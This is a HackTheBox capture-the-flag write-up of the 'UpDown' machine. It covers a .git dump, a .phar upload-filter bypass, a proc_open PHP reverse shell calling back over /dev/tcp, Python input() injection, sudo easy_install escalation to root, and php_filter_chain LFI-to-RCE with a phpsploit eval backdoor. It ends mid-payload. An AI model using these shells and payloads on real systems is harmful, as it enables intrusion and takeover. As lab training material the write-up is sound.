---
render_with_liquid: false
title: HackTheBox Writeup  UpDown
date: 2023-01-21 03:02:04 +1400
tags: [hackthebox, nmap, linux, gobuster, feroxbuster, subdomain, vulnerability-assessment, source-code-analysis, local-file-inclusion, misconfiguration, python, php, git, githacker, code-injection, injection, suid, sudo, gtfobin, easy-install, python2-input, php-disable-functions-bypass, file-upload, file-upload-bypass, oscp-like-2023, lfi2rce, phpsploit, mitmproxy]
---



UpDown presents a website designed to check the status of other webpages. The obvious attack path is an server-side request forgery, but nothing interesting comes from it. There is a dev subdomain, and I’ll find the git repo associated with it. Using that, I’ll figure out how to bypass the Apache filtering, and find a code execution vulnerability out of an LFI using the PHP Archive (or PHAR) format. With a shell, I’ll exploit a legacy Python script using input, and then get root by abusing easy_install.


# Recon
---

## Nmap

```bash

# Nmap 7.93 scan initiated Sat Jan 21 03:02:04 2023 as: nmap -sVC -Pn -p- -oA updown -v 10.10.11.177
Nmap scan report for 10.10.11.177
Host is up (0.19s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 9e1f98d7c8ba61dbf149669d701702e7 (RSA)
|   256 c21cfe1152e3d7e5f759186b68453f62 (ECDSA)
|_  256 5f6e12670a66e8e2b761bec4143ad38e (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Is my Website up ?
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Subdomains

```bash
┌──(root㉿kali)-[~/updown]
└─# gobuster vhost -u siteisup.htb --append-domain --domain siteisup.htb -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -t 100 -o domains.txt

Found: dev.siteisup.htb Status: 403 [Size: 281]
```

## TCP 80 - IS My Site UP?

![](/assets/obsidian/8bc0414f47387745e6f099ba3c7abbee.png)

It's SSRF,

There's even a debug mode to see Full HTTP Response

SSRF Refer - https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery

### Dir

```bash
┌──(root㉿kali)-[~/updown]
└─# feroxbuster -t 150 -o ferox_80.txt -k -u 'http://siteisup.htb' -w /usr/share/seclists/Discovery/Web-Content/big.txt

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.10.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://siteisup.htb
 🚀  Threads               │ 150
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/big.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.10.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💾  Output File           │ ferox_80.txt
 🏁  HTTP methods          │ [GET]
 🔓  Insecure              │ true
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        9l       31w      274c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
403      GET        9l       28w      277c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET       40l       93w     1131c http://siteisup.htb/
301      GET        9l       28w      310c http://siteisup.htb/dev => http://siteisup.htb/dev/
301      GET        9l       28w      315c http://siteisup.htb/dev/.git => http://siteisup.htb/dev/.git/
200      GET        2l        8w      112c http://siteisup.htb/dev/.git/packed-refs
200      GET       13l       35w      298c http://siteisup.htb/dev/.git/config
200      GET        3l       17w      762c http://siteisup.htb/dev/.git/index
200      GET        1l        2w       21c http://siteisup.htb/dev/.git/HEAD
200      GET        6l       43w      240c http://siteisup.htb/dev/.git/info/exclude
200      GET       42l      238w     1492c http://siteisup.htb/dev/.git/hooks/prepare-commit-msg.sample
200      GET       24l       83w      544c http://siteisup.htb/dev/.git/hooks/pre-receive.sample
200      GET        8l       32w      189c http://siteisup.htb/dev/.git/hooks/post-update.sample
200      GET      169l      798w     4898c http://siteisup.htb/dev/.git/hooks/pre-rebase.sample
200      GET       13l       67w      416c http://siteisup.htb/dev/.git/hooks/pre-merge-commit.sample
200      GET       24l      163w      896c http://siteisup.htb/dev/.git/hooks/commit-msg.sample
200      GET        1l       10w       73c http://siteisup.htb/dev/.git/description
200      GET       78l      499w     2783c http://siteisup.htb/dev/.git/hooks/push-to-checkout.sample
200      GET        1l        9w      179c http://siteisup.htb/dev/.git/logs/HEAD
200      GET      128l      546w     3650c http://siteisup.htb/dev/.git/hooks/update.sample
200      GET      173l      669w     4655c http://siteisup.htb/dev/.git/hooks/fsmonitor-watchman.sample
200      GET       14l       69w      424c http://siteisup.htb/dev/.git/hooks/pre-applypatch.sample
200      GET       49l      279w     1643c http://siteisup.htb/dev/.git/hooks/pre-commit.sample
200      GET       53l      234w     1374c http://siteisup.htb/dev/.git/hooks/pre-push.sample
200      GET       15l       79w      478c http://siteisup.htb/dev/.git/hooks/applypatch-msg.sample
[####################] - 85s    41006/41006   0s      found:23      errors:1182
[####################] - 78s    20477/20477   262/s   http://siteisup.htb/
[####################] - 66s    20477/20477   310/s   http://siteisup.htb/dev/
[####################] - 7s     20477/20477   3080/s  http://siteisup.htb/dev/.git/ => Directory listing
[####################] - 7s     20477/20477   3074/s  http://siteisup.htb/dev/.git/logs/ => Directory listing
[####################] - 1s     20477/20477   34531/s http://siteisup.htb/dev/.git/branches/ => Directory listing
[####################] - 4s     20477/20477   4719/s  http://siteisup.htb/dev/.git/info/ => Directory listing
[####################] - 7s     20477/20477   3008/s  http://siteisup.htb/dev/.git/objects/ => Directory listing
[####################] - 4s     20477/20477   5077/s  http://siteisup.htb/dev/.git/hooks/ => Directory listing
[####################] - 1s     20477/20477   34415/s http://siteisup.htb/dev/.git/refs/ => Directory listing 
```

# User Flag
---

## Shell as www-data

### Dump /dev/.git/

There's `.git` directory under `/dev/`

Use Git Hacker to dump the repo

```bash
┌──(root㉿kali)-[~]
└─# githacker --url http://siteisup.htb/dev/.git/ --output-folder git-dump q
```

### Access dev.siteisup.htb with special header

There's only a `main` branch

```bash
┌──(root㉿kali)-[~/…/GitHacker/GitHacker/git-dump/ed76a8014930496ff64f6b28f1b2b8a2]
└─# git branch
* main
```

Check Git history, something is interesting

```bash
┌──(root㉿kali)-[~/…/GitHacker/GitHacker/git-dump/ed76a8014930496ff64f6b28f1b2b8a2]
└─# git log
...
commit 8812785e31c879261050e72e20f298ae8c43b565
Author: Abdou.Y <84577967+ab2pentest@users.noreply.github.com>
Date:   Wed Oct 20 16:38:54 2021 +0200

    New technique in header to protect our dev vhost.
...
```

Get commit info

```diff
git show 8812785e31c879261050e72e20f298ae8c43b565

commit 8812785e31c879261050e72e20f298ae8c43b565
Author: Abdou.Y <84577967+ab2pentest@users.noreply.github.com>
Date:   Wed Oct 20 16:38:54 2021 +0200

    New technique in header to protect our dev vhost.

diff --git a/.htaccess b/.htaccess
index 44ff240..b317ab5 100644
--- a/.htaccess
+++ b/.htaccess
@@ -2,3 +2,4 @@ SetEnvIfNoCase Special-Dev "only4dev" Required-Header
 Order Deny,Allow
 Deny from All
 Allow from env=Required-Header
+
```

It requires the header : `Special-Dev: only4dev` to access dev vhost

```bash
cat .htaccess       

SetEnvIfNoCase Special-Dev "only4dev" Required-Header
Order Deny,Allow
Deny from All
Allow from env=Required-Header
```

Add the special header to burp proxy

![](/assets/obsidian/f7b1cfa744bdcf466f286957ea444e8c.png)

Now the dev vhost is accessible

![](/assets/obsidian/f67d3314996417df9011b3fa4d008e13.png)

### Php file upload bypass

Tried to upload a php reverse shell, but the extension is not allowed

![](/assets/obsidian/c390b8a84922ed0841f1e54133093389.png)

Do a quick search in the source code

```bash
┌──(root㉿kali)-[~/updown/git-dump/ed76a8014930496ff64f6b28f1b2b8a2]
└─# grep -Rin allowed
...
checker.php:63: # Check if extension is allowed.
checker.php:66:         die("Extension not allowed!");
```

![](/assets/obsidian/84a5fcd4798e6216ba8eb0851f9ce51f.png)

Ok, the info is
- it's a bad blacklist filter, use `.phar` to bypass
- Upload files will be deleted after all urls was checked
- Upload files will be put under `/uploads/{md5_TIME}`

> Refer - https://book.hacktricks.xyz/pentesting-web/file-upload

I'll have to put multiple inaccessible URLs to expand time before file deletion

```bash
http://google.com                                     
http://google.com                                     
http://google.com                                     
http://google.com                                     
http://google.com                                     
http://google.com                                     
http://google.com                                     
...

<?php                                                 
phpinfo();                                            
?>                                                    
```

### Bypass disable_functions

It disabled functions like `exec`, `shell_exec`, `fsockopen`, `system`

![](/assets/obsidian/0459f9a551305e70826d575873300f73.png)

Disabled Functions:

```bash
pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,pcntl_unshare,error_log,system,exec,shell_exec,popen,passthru,link,symlink,syslog,ld,mail,stream_socket_sendto,dl,stream_socket_client,fsockopen
```

Use [dfunc-bypasser](https://github.com/teambi0s/dfunc-bypasser) to check for dangerous php functions

I've saved the result of `phpinfo` to `phpinfo.txt`

```bash
┌──(bravosec㉿fsociety)-[/media/sf_Kali/htb/Machine/updown]
└─$ python2 /opt/sectools/web/Bypasses/dfunc-bypasser/dfunc-bypasser.py --file phpinfo.txt
[...]

Please add the following functions in your disable_functions option:
proc_open
If PHP-FPM is there stream_socket_sendto,stream_socket_client,fsockopen can also be used to be exploit by poisoning the request to the unix socket
```

`proc_open` wasn't disabled. So, craft a custom reverse shell that uses `proc_open` 

```bash
┌──(root㉿kali)-[/usr/share/seclists/Web-Shells/PHP]
└─# locate webshell | grep php -i
/usr/share/webshells/php
/usr/share/webshells/php/findsocket
/usr/share/webshells/php/php-backdoor.php
/usr/share/webshells/php/php-reverse-shell.php
/usr/share/webshells/php/qsd-php-backdoor.php
/usr/share/webshells/php/simple-backdoor.php
/usr/share/webshells/php/findsocket/findsock.c
/usr/share/webshells/php/findsocket/php-findsock-shell.php
```

I'll edit from `/usr/share/webshells/php/php-reverse-shell.php
`
```bash
http://google.com                                     
http://google.com                                     
http://google.com                                     
http://google.com                                     
http://google.com                                     
http://google.com                                     
http://google.com                                     
...

<?php

// Spawn shell process
$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.26/1111 0>&1'", $descriptorspec, $pipes); 

if (!is_resource($process)) {
        printit("ERROR: Can't spawn shell");
        exit(1);
}
?>
```

Got Shell

```bash
┌──(root㉿kali)-[~/updown]
└─# rlwrap nc -lvnp 1111
listening on [any] 1111 ...
connect to [10.10.14.26] from (UNKNOWN) [10.10.11.177] 58732
bash: cannot set terminal process group (907): Inappropriate ioctl for device
bash: no job control in this shell
www-data@updown:/var/www/dev/uploads/650ec8547d3c0ca19e61e0507d14f07a$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## From www-data to developer

### SUID - Code injection in python script

Found interesting SUID bits set file

```bash
www-data@updown:/$ find / -perm -u=s+ 2>/dev/null
find / -perm -u=s+  2>/dev/null
...
/home/developer/dev/siteisup

www-data@updown:/home/developer/dev$ ls -la
ls -la
total 32
drwxr-x--- 2 developer www-data   4096 Jun 22  2022 .
drwxr-xr-x 6 developer developer  4096 Aug 30 11:24 ..
-rwsr-x--- 1 developer www-data  16928 Jun 22  2022 siteisup
-rwxr-x--- 1 developer www-data    154 Jun 22  2022 siteisup_test.py
```

Check the file, found out `siteisup` will run `siteisup_test.py`

```bash
file siteisup
siteisup: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=b5bbc1de286529f5291b48db8202eefbafc92c1f, for GNU/Linux 3.2.0, not stripped

(remote) www-data@updown:/home/developer/dev$ strings siteisup
/lib64/ld-linux-x86-64.so.2
libc.so.6           
...
Welcome to 'siteisup.htb' application
/usr/bin/python /home/developer/dev/siteisup_test.py
:*3$"         
```

The script is vulnerable to Code Injection

> Refer - https://book.hacktricks.xyz/generic-methodologies-and-resources/python/bypass-python-sandboxes

```bash
(remote) www-data@updown:/home/developer/dev$ ./siteisup
Welcome to 'siteisup.htb' application

Enter URL here:__import__("os").system("/bin/bash -i")
developer@updown:/home/developer/dev$ id
uid=1002(developer) gid=33(www-data) groups=33(www-data)
```

Ok, although the user is `developer`, but the group is still `www-data`

Get ssh private key then ssh into the host

```bash
(remote) developer@updown:/home/developer/.ssh$ cat id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
...

┌──(root㉿kali)-[~/updown]
└─# ssh developer@siteisup.htb -i id_rsa
developer@updown:~$ id
uid=1002(developer) gid=1002(developer) groups=1002(developer)\

developer@updown:~$ cat user.txt
c6a8d65ad39deff149f342bfdf3e7c66
```


# Root Flag
---

## From developer to root

### SUDO - Gtfobin

```bash
developer@updown:~$ sudo -l
Matching Defaults entries for developer on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User developer may run the following commands on localhost:
    (ALL) NOPASSWD: /usr/local/bin/easy_install
developer@updown:~$ file /usr/local/bin/easy_install
/usr/local/bin/easy_install: Python script, ASCII text executable
developer@updown:~$ cat /usr/local/bin/easy_install

#!/usr/bin/python

# -*- coding: utf-8 -*-
import re
import sys
from setuptools.command.easy_install import main
if __name__ == '__main__':
    sys.argv[0] = re.sub(r'(-script\.pyw|\.exe)?$', '', sys.argv[0])
    sys.exit(main())
developer@updown:~$ 
```

search `easy install` on [GTFObin](https://gtfobins.github.io/gtfobins/easy_install/)

```bash
developer@updown:~$ TF=$(mktemp -d)
developer@updown:~$ echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
developer@updown:~$ sudo /usr/local/bin/easy_install $TF
WARNING: The easy_install command is deprecated and will be removed in a future version.
Processing tmp.4ZySzUF6Q6
Writing /tmp/tmp.4ZySzUF6Q6/setup.cfg
Running setup.py -q bdist_egg --dist-dir /tmp/tmp.4ZySzUF6Q6/egg-dist-tmp-FkFLy_

# id
uid=0(root) gid=0(root) groups=0(root)

# ls
egg-dist-tmp-FkFLy_  setup.cfg  setup.py  temp

# cd ~

# cat root.txt
5763ffb00507f9bee7217d64d96d7542
```


# Additional
---

## LFI to RCE via php_filter_chain


### Validate exploit

> http://dev.siteisup.htb/

`?page=` is vulnerable to LFI

```bash
┌──(bravosec㉿fsociety)-[/media/sf_Kali/htb/Machine/updown]
└─$ katana -jc -d 5 -kf all -f qurl -jsl -silent -o katana_params.txt -u 'http://dev.siteisup.htb/' -H 'Special-Dev: only4dev'
http://dev.siteisup.htb/?page=admin
```

```bash
┌──(bravosec㉿fsociety)-[/media/sf_Kali/htb/Machine/updown]
└─$ curl -H 'Special-Dev: only4dev' 'http://dev.siteisup.htb/?page=php://filter/convert.base64-encode/resource=index'
<b>This is only for developers</b>
<br>
<a href="?page=admin">Admin Panel</a>
PGI+VGhpcyBpcyBvbmx5IGZvciBkZXZlbG9wZXJzPC9iPgo8YnI+CjxhIGhyZWY9Ij9wYWdlPWFkbWluIj5BZG1pbiBQYW5lbDwvYT4KPD9waHAKCWRlZmluZSgiRElSRUNUQUNDRVNTIixmYWxzZSk7CgkkcGFnZT0kX0dFVFsncGFnZSddOwoJaWYoJHBhZ2UgJiYgIXByZWdfbWF0Y2goIi9iaW58dXNyfGhvbWV8dmFyfGV0Yy9pIiwkcGFnZSkpewoJCWluY2x1ZGUoJF9HRVRbJ3BhZ2UnXSAuICIucGhwIik7Cgl9ZWxzZXsKCQlpbmNsdWRlKCJjaGVja2VyLnBocCIpOwoJfQkKPz4K 
```

Source code :

> `index.php`

```php
<b>This is only for developers</b>
<br>
<a href="?page=admin">Admin Panel</a>
<?php
        define("DIRECTACCESS",false);
        $page=$_GET['page'];
        if($page && !preg_match("/bin|usr|home|var|etc/i",$page)){
                include($_GET['page'] . ".php");
        }else{
                include("checker.php");
        }
?>
```

Since it adds `.php` at the end of file name, we can't do log poisoning

Use `php_filter_chain` instead

> https://github.com/synacktiv/php_filter_chain_generator

```bash
┌──(bravosec㉿fsociety)-[/media/sf_Kali/htb/Machine/updown]
└─$ python3 /opt/sectools/web/PHP/php_filter_chain_generator/php_filter_chain_generator.py --chain '<?=phpinfo();?>'
[+] The following gadget chain will generate the following code : <?=phpinfo();?> (base64 value: PD89cGhwaW5mbygpOz8+)
php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16|convert.iconv.WINDOWS-1258.UTF32LE|convert.iconv.ISIRI3342.ISO-IR-157|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSA_T500.UTF-32|convert.iconv.CP857.ISO-2022-JP-3|convert.iconv.ISO2022JP2.CP775|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM891.CSUNICODE|convert.iconv.ISO8859-14.ISO6937|convert.iconv.BIG-FIVE.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.CP1163.CSA_T500|convert.iconv.UCS-2.MSCP949|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp
```

![](/assets/obsidian/79209d951a30edb897e5a9ff93010b7a.png)

### Bypass disable_functions with phpsploit

> **phpsploit**'s alternative : [evalsploit](https://github.com/MarkTauber/evalsploit)

Start **mitmproxy** to inject `Special-Dev: only4dev` header for **phpsploit**

```bash
mitmproxy --ssl-insecure -p 8090 --modify-headers '/~q/Special-Dev/only4dev'
```

```bash
proxychains -f ~/configs/proxychains/mitmproxy.conf phpsploit --interactive --eval "set PASSKEY HTB; exploit"
```

```bash
[...]
[*] 26 plugins correctly loaded
[*] Current backdoor is: <?php @eval($_SERVER['HTTP_HTB']); ?>

To run a remote tunnel, the backdoor shown above must be
manually injected in a remote server executable web page.
Then, use `set TARGET <BACKDOORED_URL>` and run `exploit`.
phpsploit >
```

```bash
┌──(bravosec㉿fsociety)-[/media/sf_Kali/htb/Machine/updown]
└─$ python3 /opt/sectools/web/PHP/php_filter_chain_generator/php_filter_chain_generator.py --chain '<?php @eval($_SERVER["HTTP_HTB"]); ?>'
[+] The following gadget chain will generate the following code : <?php @eval($_SERVER["HTTP_HTB"]); ?> (base64 value: PD9waHAgQGV2YWwoJF9TRVJWRVJbIkhUVFBfSFRCIl0pOyA/Pg)
php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.UCS2.UTF-8|convert.iconv.CSISOLATIN6.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSA_T500.UTF-32|convert.iconv.CP857.ISO-2022-JP-3|convert.iconv.ISO2022JP2.CP775|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM891.CSUNICODE|convert.iconv.ISO8859-14.ISO6937|convert.iconv.BIG-FIVE.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.SJIS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500.L4|convert.iconv.ISO_8859-2.ISO-IR-103|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-4LE.OSF05010001|convert.iconv.IBM912.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP949.UTF32BE|convert.iconv.ISO_69372.CSIBM921|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500-1983.UCS-2BE|convert.ico